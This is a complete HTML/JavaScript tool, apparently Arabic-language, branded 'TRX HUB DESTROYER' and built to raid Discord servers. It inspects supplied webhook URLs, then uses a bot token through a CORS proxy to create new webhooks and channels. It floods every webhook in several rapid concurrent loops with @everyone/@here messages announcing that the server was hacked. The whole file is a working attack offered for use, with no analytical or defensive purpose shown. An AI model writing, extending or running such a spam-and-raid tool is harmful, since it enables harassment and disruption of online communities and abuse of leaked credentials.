<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>☣️ TRX HUB ☣️ · DESTROYER</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.box{background:#111;border:1px solid #2a2a2a;border-radius:30px;padding:40px;width:600px;max-width:100%;text-align:center}
h1{color:#ff1a1a;letter-spacing:5px;margin:0 0 5px;font-size:42px}
.sub{color:#555;font-size:12px;margin:0 0 20px;letter-spacing:3px}
input,textarea{width:100%;padding:12px 18px;background:#1a1a1a;border:1px solid #333;border-radius:30px;color:#fff;font-size:13px;outline:none;font-family:inherit;margin-bottom:8px;direction:ltr;text-align:left}
input:focus{border-color:#ff1a1a}
textarea{border-radius:16px;height:150px;margin-top:10px;background:#050505;color:#00ff88;font-family:'Courier New',monospace;font-size:11px;resize:none;overflow-y:auto}
.row{display:flex;gap:8px;margin:5px 0;flex-wrap:wrap}
.row>*{flex:1;min-width:100px}
.btn{padding:12px 16px;border:none;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:2px;transition:.2s}
.btn:hover:not(:disabled){transform:scale(1.02)}
.btn:disabled{opacity:.3;cursor:not-allowed}
.btn-red{background:#cc0000;color:#fff}
.btn-red:hover:not(:disabled){background:#ff1a1a}
.btn-dark{background:#222;color:#888;border:1px solid #444}
.btn-dark:hover:not(:disabled){background:#cc0000;color:#fff;border-color:#cc0000}
.btn-green{background:#006600;color:#fff}
.btn-green:hover:not(:disabled){background:#009900}
.btn-blue{background:#003366;color:#fff}
.btn-blue:hover:not(:disabled){background:#0055aa}
.section{background:#0d0d0d;border:1px solid #222;border-radius:20px;padding:18px;margin:12px 0;text-align:left}
.section-title{color:#ff1a1a;font-size:13px;letter-spacing:2px;margin-bottom:10px}
.stat{color:#888;font-size:13px;margin:3px 0}
#cnt{color:#00ff88;font-size:28px;font-weight:700}
.wh-item{display:flex;gap:6px;align-items:center;margin-bottom:6px}
.wh-item input{flex:1;margin-bottom:0}
.wh-item .del-btn{background:#660000;color:#fff;border:none;border-radius:30px;padding:12px 16px;cursor:pointer;font-size:16px}
.wh-item .del-btn:hover{background:#990000}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.info-item{background:#0a0a0a;padding:8px 12px;border-radius:12px;border:1px solid #1a1a1a}
.info-label{color:#555;font-size:10px;letter-spacing:1px}
.info-value{color:#fff;font-size:13px;word-break:break-all}
.badge{color:#ff1a1a;font-size:11px;margin-top:10px;letter-spacing:2px;opacity:.6}
.note{color:#886600;font-size:11px;padding:8px 12px;background:#1a1100;border-radius:12px;margin:5px 0;border:1px solid #332200}
.checkbox-row{display:flex;align-items:center;gap:10px;margin:5px 0}
.checkbox-row input[type="checkbox"]{width:auto;margin:0}
.checkbox-row label{font-size:13px;color:#888}
.small-input{padding:8px 14px;font-size:12px}
</style>
</head>
<body>
<div class="box">
<h1>☠️ TRX</h1>
<p class="sub">● فحص + سبام + إنشاء ويبهوك + رومات ●</p>
<div class="row">
<input type="text" id="whInput" placeholder="https://discord.com/api/webhooks/..." style="flex:3">
<button class="btn btn-blue" id="scanBtn" onclick="SCAN()" style="flex:1">🔍 فحص</button>
</div>
<div class="section" id="infoSection" style="display:none">
<div class="section-title">📋 معلومات السيرفر</div>
<div class="info-grid">
<div class="info-item"><div class="info-label">اسم السيرفر</div><div class="info-value" id="guildName">-</div></div>
<div class="info-item"><div class="info-label">ID السيرفر</div><div class="info-value" id="guildId">-</div></div>
<div class="info-item"><div class="info-label">اسم القناة</div><div class="info-value" id="channelName">-</div></div>
<div class="info-item"><div class="info-label">ID القناة</div><div class="info-value" id="channelId">-</div></div>
<div class="info-item"><div class="info-label">اسم الويبهوك</div><div class="info-value" id="whName">-</div></div>
<div class="info-item"><div class="info-label">ID الويبهوك</div><div class="info-value" id="whId">-</div></div>
</div>
<div id="otherWebhooks" style="margin-top:10px"></div>
</div>
<div class="section">
<div class="section-title">🤖 بوت توكين</div>
<input type="text" id="botToken" placeholder="ODIzNTI4MDAxMjM0NTY3ODkw.GHkLmN.xxxxxxxxxx">
<div class="row">
<input type="text" id="proxyUrl" class="small-input" value="https://corsproxy.io/?" style="flex:3">
<label style="flex:1;font-size:11px;color:#666;display:flex;align-items:center;">بروكسي</label>
</div>
<div class="note">⚠️ الرومات تحتاج بوت + بروكسي</div>
</div>
<div class="section">
<div class="section-title">🔗 الويبهوكات</div>
<div id="whList">
<div class="wh-item">
<input type="text" class="wh-url" placeholder="https://discord.com/api/webhooks/...">
<button class="del-btn" onclick="removeWebhook(this)">✕</button>
</div>
</div>
<button class="btn btn-dark" onclick="addWebhook()" style="width:100%;margin-top:5px">➕ إضافة ويبهوك</button>
</div>
<div class="row" style="margin:10px 0">
<button class="btn btn-green" id="createWhBtn" onclick="CREATE_WEBHOOK()">🆕 إنشاء</button>
<button class="btn btn-red" id="startBtn" onclick="START()">💀 ابدأ</button>
<button class="btn btn-dark" id="stopBtn" onclick="STOP()" disabled>⛔ إيقاف</button>
</div>
<div class="checkbox-row">
<input type="checkbox" id="createChannels" checked>
<label for="createChannels">إنشاء رومات ☣️TRX☣️</label>
</div>
<div class="stat">الرسائل:</div>
<div id="cnt">0</div>
<textarea id="log" readonly></textarea>
<div class="badge">● ☣️ TRX ☣️ HUB ☣️ ●</div>
</div>
<script>
let running=false,stopped=false,sent=0,allTimers=[],createdChannels=[],webhookInfo=null;
const AVATAR_URL='https://github.com/Rxz60/MR-HUB/raw/refs/heads/main/IMG_5011.jpeg';
const $=id=>document.getElementById(id);
const log=msg=>{const e=$('log');e.value+=`[${new Date().toLocaleTimeString('ar-SA')}] ${msg}\n`;e.scrollTop=e.scrollHeight};

async function SCAN(){
const url=$('whInput').value.trim();
if(!url){alert('حط رابط ويبهوك');return}
const m=url.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
if(!m){log('❌ رابط غير صالح');return}
const whId=m[1],whToken=m[2];
log('🔍 جاري الفحص...');
try{
const r=await fetch(`https://discord.com/api/webhooks/${whId}/${whToken}`,{method:'GET',headers:{'Content-Type':'application/json'}});
if(!r.ok){
log(`⚠️ CORS يمنع القراءة (${r.status})`);
$('guildId').textContent=whId;$('whId').textContent=whId;$('infoSection').style.display='block';
return
}
const data=await r.json();webhookInfo=data;
$('guildName').textContent=data.name||'-';$('guildId').textContent=data.guild_id||'-';$('channelName').textContent='-';$('channelId').textContent=data.channel_id||'-';$('whName').textContent=data.name||'-';$('whId').textContent=data.id||whId;
$('infoSection').style.display='block';
$('otherWebhooks').innerHTML='<div class="note">ℹ️ باقي الويبهوكات تحتاج بوت</div>';
const inputs=document.querySelectorAll('.wh-url');let found=false;
for(const e of inputs){if(e.value.trim()===url){found=true;break}}
if(!found){const fi=document.querySelector('.wh-url');if(fi&&!fi.value.trim())fi.value=url;else addWebhookWithValue(url)}
log(`✅ ${data.name||'تم'}`);
}catch(e){log(`❌ ${e.message}`)}
}

function addWebhook(){const l=$('whList'),d=document.createElement('div');d.className='wh-item';d.innerHTML='<input type="text" class="wh-url" placeholder="https://discord.com/api/webhooks/..."><button class="del-btn" onclick="removeWebhook(this)">✕</button>';l.appendChild(d)}
function addWebhookWithValue(v){const l=$('whList'),d=document.createElement('div');d.className='wh-item';d.innerHTML=`<input type="text" class="wh-url" value="${v}" placeholder="https://discord.com/api/webhooks/..."><button class="del-btn" onclick="removeWebhook(this)">✕</button>`;l.appendChild(d)}
function removeWebhook(b){const items=document.querySelectorAll('.wh-item');if(items.length<=1){log('⚠️ لازم ويبهوك واحد');return}b.parentElement.remove()}
function getAllWebhookUrls(){const inputs=document.querySelectorAll('.wh-url'),urls=[];for(const e of inputs){const v=e.value.trim();if(v)urls.push(v)}return urls}

async function CREATE_WEBHOOK(){
const whUrl=$('whInput').value.trim(),token=$('botToken').value.trim(),proxy=$('proxyUrl').value.trim();
if(!whUrl){alert('حط رابط ويبهوك');return}
if(!token){alert('حط بوت توكين');return}
const m=whUrl.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
if(!m){log('❌ رابط غير صالح');return}
if(!webhookInfo||!webhookInfo.channel_id){log('❌ اضغط فحص أول');return}
const channelId=webhookInfo.channel_id,apiUrl=`https://discord.com/api/v10/channels/${channelId}/webhooks`,finalUrl=proxy+encodeURIComponent(apiUrl);
log('🆕 إنشاء ويبهوك...');
try{
const r=await fetch(finalUrl,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${token}`},body:JSON.stringify({name:'TRX ☣️'})});
if(r.ok){const d=await r.json(),wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;log('✅ تم');addWebhookWithValue(wu);$('whInput').value=wu}
else{const t=await r.text();log(`❌ ${r.status} ${t.slice(0,80)}`)}
}catch(e){log(`❌ ${e.message}`)}
}

async function CREATE_CHANNELS(){
const token=$('botToken').value.trim(),proxy=$('proxyUrl').value.trim();
if(!token){log('⚠️ مافي بوت');return false}
if(!webhookInfo||!webhookInfo.guild_id){log('❌ اضغط فحص أول');return false}
const guildId=webhookInfo.guild_id;let successCount=0;
for(let i=0;i<5;i++){
if(stopped)break;const name=`☣️trx☣️-${i+1}`;
try{
const r=await fetch(proxy+encodeURIComponent(`https://discord.com/api/v10/guilds/${guildId}/channels`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${token}`},body:JSON.stringify({name:name,type:0})});
if(r.ok){const d=await r.json();createdChannels.push(d.id);successCount++;log(`✅ #${name}`)}
else{log(`❌ ${r.status}`);if(r.status===0)log('⚠️ CORS');break}
}catch(e){log(`❌ ${e.message}`);break}
}
if(successCount>0)log(`🔥 ${successCount} روم`);
return successCount>0
}

async function DELETE_CHANNELS(){
const token=$('botToken').value.trim(),proxy=$('proxyUrl').value.trim();
if(createdChannels.length===0)return
if(!token){log('⚠️ مافي بوت');return}
log(`🗑️ حذف ${createdChannels.length}...`);let deleted=0;
for(const id of createdChannels){
if(stopped)break
try{
const r=await fetch(proxy+encodeURIComponent(`https://discord.com/api/v10/channels/${id}`),{method:'DELETE',headers:{'Authorization':`Bot ${token}`}});
if(r.ok||r.status===404)deleted++
else{log(`❌ ${r.status}`);if(r.status===0)log('⚠️ CORS')}
}catch(e){log(`❌ ${e.message}`)}
}
log(`✅ حذف ${deleted} روم`);createdChannels=[]
}

async function sendMsg(wh,text){
if(stopped)return
try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:text,username:'☣️ TRX HUB ☣️',avatar_url:AVATAR_URL})});sent++;$('cnt').textContent=sent}catch(e){}
}
async function sendToAll(text){const urls=getAllWebhookUrls();for(const u of urls)sendMsg(u,text)}

function spamLoop1(t){if(stopped)return;for(let i=0;i<20;i++)sendToAll(t);allTimers.push(setTimeout(()=>spamLoop1(t),100))}
function spamLoop2(t){if(stopped)return;for(let i=0;i<15;i++)sendToAll(t);allTimers.push(setTimeout(()=>spamLoop2(t),150))}
function spamLoop3(t){if(stopped)return;for(let i=0;i<15;i++)sendToAll(t);allTimers.push(setTimeout(()=>spamLoop3(t),200))}
function spamLoop4(t){if(stopped)return;for(let i=0;i<10;i++)sendToAll(t);allTimers.push(setTimeout(()=>spamLoop4(t),80))}
function spamLoop5(t){if(stopped)return;for(let i=0;i<25;i++)sendToAll(t);allTimers.push(setTimeout(()=>spamLoop5(t),120))}

async function START(){
const urls=getAllWebhookUrls();if(urls.length===0){alert('⚠️ أضف ويبهوك');return}
if(running)return
running=true;stopped=false;sent=0;allTimers=[];createdChannels=[]
$('cnt').textContent='0';$('startBtn').disabled=true;$('stopBtn').disabled=false;$('scanBtn').disabled=true;$('createWhBtn').disabled=true;$('log').value=''
log('🚀 TRX ☣️ DESTROYER');log(`📌 ${urls.length} ويبهوك`)
const msg='@everyone @here تم التهكير من قبل TRX | HUB - النظام التراكسي - ☣️ @here @everyone'
spamLoop1(msg);spamLoop2(msg);spamLoop3(msg);spamLoop4(msg);spamLoop5(msg)
if($('createChannels').checked){log('🏗️ رومات...');await CREATE_CHANNELS()}
allTimers.push(setInterval(()=>{if(stopped)return;log(`📊 ${sent}`)},5000))
}

async function STOP(){
if(!running)return
log('⛔ إيقاف...');stopped=true
for(const t of allTimers)clearTimeout(t);allTimers=[]
if(createdChannels.length>0){log('🗑️ حذف الرومات...');await DELETE_CHANNELS()}
setTimeout(()=>{running=false;$('startBtn').disabled=false;$('stopBtn').disabled=true;$('scanBtn').disabled=false;$('createWhBtn').disabled=false;log(`🛑 ${sent} رسالة`)},300)
}
</script>
</div>
</body>
</html>
